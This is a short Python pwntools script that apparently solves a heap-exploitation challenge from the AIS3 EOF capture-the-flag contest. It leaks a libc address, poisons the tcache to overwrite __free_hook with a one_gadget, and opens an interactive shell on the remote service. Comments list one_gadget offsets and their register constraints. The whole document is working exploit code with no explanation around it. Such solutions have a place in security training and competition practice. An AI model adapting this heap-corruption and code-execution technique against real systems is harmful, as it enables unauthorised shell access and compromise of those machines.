from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

libc = ELF('./libc-2.29.so')
r = remote('eof.ais3.org', 10105)

def add(size):
    r.sendlineafter('Your choice: \n', '1')
    r.sendlineafter('Size: ', str(size))

def rm(offset):
    r.sendlineafter('Your choice: \n', '2')
    r.sendlineafter('Offset: ', str(offset))

def write(data):
    r.sendlineafter('Your choice: \n', '3')
    r.sendafter('Data: ', data[:6])

r.recvuntil('Here you are :P 0x')
printf = int(r.recvline(), 16)
libc.address = printf - libc.sym.printf
success('libc='+hex(libc.address))

add(0x68)
rm(0)
write(p64(libc.sym.__free_hook))
add(0x68)
add(0x68)
write(p64(libc.address + 0x106ef8))
rm(0)

#  0xe237f execve("/bin/sh", rcx, [rbp-0x70])
#  constraints:
#    [rcx] == NULL || rcx == NULL
#    [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

#  0xe2383 execve("/bin/sh", rcx, rdx)
#  constraints:
#    [rcx] == NULL || rcx == NULL
#    [rdx] == NULL || rdx == NULL

#  0xe2386 execve("/bin/sh", rsi, rdx)
#  constraints:
#    [rsi] == NULL || rsi == NULL
#    [rdx] == NULL || rdx == NULL

#  0x106ef8 execve("/bin/sh", rsp+0x70, environ)
#  constraints:
#    [rsp+0x70] == NULL


r.interactive()
